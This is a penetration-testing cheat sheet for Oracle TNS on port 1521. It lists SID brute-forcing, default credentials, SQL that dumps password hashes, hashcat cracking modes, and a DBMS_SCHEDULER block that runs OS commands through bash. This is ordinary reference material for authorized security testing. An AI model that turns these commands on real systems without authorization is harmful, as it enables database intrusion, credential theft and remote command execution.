# Oracle TNS (1521)

!!! tip "Start here"
    Enumerate service identifiers first: `odat.py sidguesser -s $IP`. Once you have one, validate credentials with ODAT or connect using an Easy Connect string.

---

## Enumeration

```bash
nmap -p 1521 --script oracle-tns-version $IP
```

---

## SID Enumeration

```bash
nmap -p 1521 --script oracle-sid-brute $IP
odat.py sidguesser -s $IP
odat.py passwordguesser -s $IP -d "$SID"
```

---

## Authentication

```bash
sqlplus "$USERNAME@$IP:1521/$SERVICE_NAME"
```

Default credentials to try:

```
SCOTT:tiger
SYS:oracle
SYSTEM:manager
HR:hr
DBSNMP:dbsnmp
```

---

## Post-Auth Enumeration

```sql
SELECT * FROM session_privs;                                      -- current privileges
SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
SELECT * FROM dba_db_links;                                       -- linked databases
SELECT name, password FROM sys.user$;                             -- password hashes
```

---

## Hash Cracking

Choose the mode from the stored verifier type, not merely the Oracle version:

```bash
hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt   # Oracle H (older verifier)
hashcat -m 112 hashes.txt /usr/share/wordlists/rockyou.txt    # Oracle S (11g+)
hashcat -m 12300 hashes.txt /usr/share/wordlists/rockyou.txt  # Oracle T (12c+)
```

---

## OS Command Execution (DBA Required)

If the account has DBA privileges, schedule an OS command via DBMS_SCHEDULER:

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'cmd_job',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE);
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_job', 2, 'id > /tmp/out.txt');
  DBMS_SCHEDULER.ENABLE('cmd_job');
END;
/
```
